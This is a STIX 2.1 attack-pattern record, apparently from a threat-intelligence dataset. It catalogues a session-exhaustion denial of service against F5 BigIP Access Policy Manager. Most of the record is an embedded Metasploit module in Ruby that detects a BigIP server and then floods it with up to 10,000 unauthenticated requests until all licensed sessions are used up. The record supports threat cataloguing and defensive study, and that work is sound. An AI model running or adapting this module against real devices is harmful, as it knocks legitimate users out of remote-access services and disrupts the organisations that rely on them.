{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c142ec64-035d-4bed-add2-c168f171fe0f",
    "created": "2024-08-14T16:26:09.748981Z",
    "modified": "2024-08-14T16:26:09.748986Z",
    "name": "F5 BigIP Access Policy Manager Session Exhaustion Denial of Service",
    "description": " This module exploits a resource exhaustion denial of service in F5 BigIP devices. An unauthenticated attacker can establish multiple connections with BigIP Access Policy Manager (APM) and exhaust all available sessions defined in customer license. In the first step of the BigIP APM negotiation the client sends a HTTP request. The BigIP system creates a session, marks it as pending and then redirects the client to an access policy URI. Since BigIP allocates a new session after the first unauthenticated request and deletes the session only if an access policy timeout expires, the attacker can exhaust all available sessions by repeatedly sending the initial HTTP request and leaving the sessions as pending. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/f5_bigip_apm_max_sessions.rb",
            "external_id": "f5_bigip_apm_max_sessions.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/kb/en-us/products/big-ip_apm/releasenotes/product/relnote-apm-11-6-0.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'F5 BigIP Access Policy Manager Session Exhaustion Denial of Service',\n      'Description'    => %q{\n        This module exploits a resource exhaustion denial of service in F5 BigIP devices. An\n        unauthenticated attacker can establish multiple connections with BigIP Access Policy\n        Manager (APM) and exhaust all available sessions defined in customer license. In the\n        first step of the BigIP APM negotiation the client sends a HTTP request. The BigIP\n        system creates a session, marks it as pending and then redirects the client to an access\n        policy URI. Since BigIP allocates a new session after the first unauthenticated request,\n        and deletes the session only if an access policy timeout expires, the attacker can exhaust\n        all available sessions by repeatedly sending the initial HTTP request and leaving the\n        sessions as pending.\n      },\n      'Author'         =>\n        [\n          'Denis Kolegov <dnkolegov[at]gmail.com>',\n          'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',\n          'Nikita Oleksov <neoleksov[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://support.f5.com/kb/en-us/products/big-ip_apm/releasenotes/product/relnote-apm-11-6-0.html']\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'RPORT' => 443\n        }\n    ))\n\n    register_options(\n      [\n        OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000]),\n        OptBool.new('FORCE', [true, 'Proceed with attack even if a BigIP virtual server isn\\'t detected', false])\n      ])\n  end\n\n  def run\n    limit = datastore['RLIMIT']\n    force_attack = datastore['FORCE']\n\n    res = send_request_cgi('method' => 'GET', 'uri' => '/')\n\n    unless res\n      print_error(\"No answer from the BigIP server\")\n      return\n    end\n\n    # Simple test based on HTTP Server header to detect BigIP virtual server\n    server = res.headers['Server']\n    unless server =~ /BIG\\-IP/ || server =~ /BigIP/ || force_attack\n      print_error(\"BigIP virtual server was not detected. Please check options\")\n      return\n    end\n\n    print_status(\"Starting DoS attack\")\n\n    # Start attack\n    limit.times do |step|\n      if step % 100 == 0\n        print_status(\"#{step * 100 / limit}% accomplished...\")\n      end\n      res = send_request_cgi('method' => 'GET', 'uri' => '/')\n      if res && res.headers['Location'] =~ /\\/my\\.logout\\.php3\\?errorcode=14/\n        print_good(\"DoS accomplished: The maximum number of concurrent user sessions has been reached.\")\n        return\n      end\n    end\n\n    # Check if attack has failed\n    res = send_request_cgi('method' => 'GET', 'uri' => uri)\n    if res.headers['Location'] =~ /\\/my.policy/\n      print_error(\"DoS attack failed. Try to increase the RLIMIT\")\n    else\n      print_status(\"Result is undefined. Try to manually determine DoS attack result\")\n    end\n\n    rescue ::Errno::ECONNRESET\n      print_error(\"The connection was reset. Maybe BigIP 'Max In Progress Sessions Per Client IP' counter was reached\")\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Unable to connect to BigIP\")\n    rescue ::Rex::ConnectionTimeout\n      print_error(\"Unable to connect to BigIP. Please check options\")\n    rescue ::OpenSSL::SSL::SSLError\n      print_error(\"SSL/TLS connection error\")\n  end\nend\n"
}